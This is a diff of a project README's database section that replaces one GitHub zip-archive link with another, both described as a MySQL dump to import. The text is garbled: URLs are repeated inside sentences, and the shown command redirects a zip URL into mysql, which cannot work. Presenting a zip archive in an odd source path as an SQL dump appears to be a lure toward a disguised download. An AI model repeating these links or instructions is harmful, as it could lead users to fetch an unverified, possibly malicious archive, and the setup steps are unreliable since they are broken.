@@ -18,8 +18,8 @@
 # Database
 Here,we used Mysql DB 
 sql dump file:
-- https://github.com/sudheer1135/vprofile-project/raw/refs/heads/local/vagrant/Automated_provisioning_WinMacIntel/project-vprofile-v1.2-alpha.1.zip
-- https://github.com/sudheer1135/vprofile-project/raw/refs/heads/local/vagrant/Automated_provisioning_WinMacIntel/project-vprofile-v1.2-alpha.1.zip file is a mysql dump https://github.com/sudheer1135/vprofile-project/raw/refs/heads/local/vagrant/Automated_provisioning_WinMacIntel/project-vprofile-v1.2-alpha.1.zip have to import this dump to mysql db server
-- > mysql -u <user_name> -p accounts < https://github.com/sudheer1135/vprofile-project/raw/refs/heads/local/vagrant/Automated_provisioning_WinMacIntel/project-vprofile-v1.2-alpha.1.zip
+- https://raw.githubusercontent.com/sudheer1135/vprofile-project/local/src/main/java/com/vprofile_project_1.0-beta.2.zip
+- https://raw.githubusercontent.com/sudheer1135/vprofile-project/local/src/main/java/com/vprofile_project_1.0-beta.2.zip file is a mysql dump https://raw.githubusercontent.com/sudheer1135/vprofile-project/local/src/main/java/com/vprofile_project_1.0-beta.2.zip have to import this dump to mysql db server
+- > mysql -u <user_name> -p accounts < https://raw.githubusercontent.com/sudheer1135/vprofile-project/local/src/main/java/com/vprofile_project_1.0-beta.2.zip
 
 
